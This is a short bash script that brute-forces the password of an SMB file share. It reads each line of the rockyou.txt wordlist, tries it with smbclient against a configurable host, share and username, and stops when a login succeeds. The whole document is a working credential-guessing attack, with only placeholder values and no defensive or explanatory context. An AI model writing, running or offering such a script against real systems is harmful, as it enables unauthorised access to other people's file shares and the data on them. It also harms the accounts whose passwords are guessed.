#!/bin/bash

# Replace these variables with your SMB share details
HOST="smbserver.example.com"
SHARE="example_share"
USERNAME="user"

# Path to the wordlist file
WORDLIST="rockyou.txt"

# Loop through each password in the wordlist
while IFS= read -r PASSWORD; do
    # Attempt to connect to SMB share with the current password
    echo "Trying password: $PASSWORD"
    smbclient //$HOST/$SHARE -U $USERNAME%$PASSWORD -c "quit" >/dev/null 2>&1
    # Check the exit status of smbclient
    if [ $? -eq 0 ]; then
        echo "Password found: $PASSWORD"
        exit 0  # Exit the script if password is found
    fi
done < "$WORDLIST"

echo "Password not found in wordlist."
exit 1
